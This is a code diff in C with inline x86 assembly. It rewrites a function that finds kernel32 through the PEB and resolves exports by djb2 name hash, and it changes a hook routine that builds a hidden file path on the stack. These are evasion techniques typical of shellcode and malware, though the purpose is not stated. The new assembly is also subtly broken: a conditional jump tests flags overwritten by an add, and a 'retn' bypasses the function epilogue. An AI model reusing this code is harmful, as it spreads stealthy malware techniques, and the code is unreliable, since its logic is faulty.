@@ -3,7 +3,8 @@
 
 ULONG KernelResolver(ULONG Hash)
 {
-    ULONG KernelBase;
+    UNREFERENCED_PARAMETER(Hash);
+    ULONG Val = ':(';
     __asm {
         xor eax, eax
         mov eax, FS:[0x30]
@@ -12,43 +13,56 @@ ULONG KernelResolver(ULONG Hash)
         mov eax, [eax]
         mov eax, [eax]
         mov eax, [eax + 0x10]
-        mov KernelBase, eax
+        mov edi, eax
+        add eax, [eax + 0x3C] // PE
+        mov eax, [eax + 0x78] // Exports
+        cmp eax, 0
+        add eax, edi
+        je _end
+        mov ecx, 0
+        mov ebx, [eax + 0x20] // Address of names
+        add ebx, edi
+        _loop_names :
+        cmp ecx, [eax + 0x18] // Number of names
+        je _end
+        mov esi, [ebx]
+        add esi, edi
+        mov edx, 5381
+        push ecx
+        push edi
+        _loop_name :
+        cmp byte ptr[esi], 0
+        je _end_name
+        mov edi, edx
+        shl edi, 5
+        add edi, edx
+        movzx ecx, byte ptr[esi]
+        add edi, ecx
+        mov edx, edi
+        inc esi
+        jmp _loop_name
+        _end_name :
+        pop edi
+        pop ecx
+        cmp edx, [ebp+8]
+        jne _not_eq
+        mov esi, [eax + 0x24] // Ordinals
+        add esi, edi
+        movzx esi, word ptr[esi + 2 * ecx]
+        mov edx, [eax + 0x1C] // Functions
+        add edx, edi
+        mov eax, [edx + 4 * esi]
+        add eax, edi
+        mov Val, eax
+        jmp _end
+        _not_eq :
+        add ebx, 4
+        inc ecx
+        jmp _loop_names
+        _end :
+        retn 4
     }
-
-    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)(KernelBase);
-    if (Dos->e_magic != MZ)
-    {
-    return ':(';
-    }
-
-    PIMAGE_NT_HEADERS32 NtHeader = (PIMAGE_NT_HEADERS32)(KernelBase + Dos->e_lfanew);
-    PIMAGE_DATA_DIRECTORY ExportsDirectory = &NtHeader->OptionalHeader.DataDirectory[0];
-    if (ExportsDirectory->VirtualAddress == 0 || ExportsDirectory->Size == 0) {
-    return ':(';
-    }
-
-    PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)(KernelBase + ExportsDirectory->VirtualAddress);
-    if (ExportDir->NumberOfNames > 0)
-    {
-        PULONG Names = (PULONG)(KernelBase + ExportDir->AddressOfNames);
-        PUSHORT Ordinals = (PUSHORT)(KernelBase + ExportDir->AddressOfNameOrdinals);
-        PULONG Functions = (PULONG)(KernelBase + ExportDir->AddressOfFunctions);
-
-        for (SIZE_T i = 0; i < ExportDir->NumberOfNames; i++)
-        {
-            PCHAR Name = (PCHAR)(Names[i] + KernelBase);
-            ULONG CurrentHash = 5381;
-            while (*Name)
-            {
-            CurrentHash = ((CurrentHash << 5) + CurrentHash) + (*Name++);
-            }
-            if (Hash == CurrentHash)
-            {
-                return KernelBase + Functions[Ordinals[i]];
-            }
-        }
-    }
-    return ':(';
+    return Val;
 }
 
 INT HookFunc(PCSTR pNodeName, PCSTR pServiceName, PVOID pHints, PVOID *ppResult)
@@ -148,8 +162,10 @@ INT HookFunc(PCSTR pNodeName, PCSTR pServiceName, PVOID pHints, PVOID *ppResult)
             __asm
             {
                 push 0
-                push '  cu'
-                push 's\\:C'
+                push ' cus'
+                push '\\72n'
+                push 'ohty'
+                push 'P\\:C'
                 lea ebx, [esp]
                 push 0
                 push FILE_ATTRIBUTE_NORMAL
